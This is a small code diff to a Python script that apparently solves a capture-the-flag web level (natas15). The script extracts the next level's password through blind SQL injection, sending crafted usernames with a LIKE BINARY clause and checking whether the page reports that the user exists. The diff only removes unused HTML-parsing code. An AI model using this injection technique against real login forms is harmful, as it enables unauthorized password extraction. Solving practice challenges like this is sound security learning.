@@ -3,8 +3,6 @@
 import os
 import string
 
-from bs4 import BeautifulSoup
-
 import requests
 from requests.auth import HTTPBasicAuth
 
@@ -23,10 +21,7 @@ def main():
             guess = password + c
             username = "natas16\" AND password LIKE BINARY \'" + guess + "%\' \""
             r = requests.post(URL, auth=AUTH, data={'username': username}, params=PARAMS)
-
             html_body = str(r.content, encoding='ascii')
-            doc = BeautifulSoup(html_body, 'html.parser')
-            content = str(doc.find_all(id='content')[0])
 
             if html_body.find("This user exists.") != -1:
                 password += c
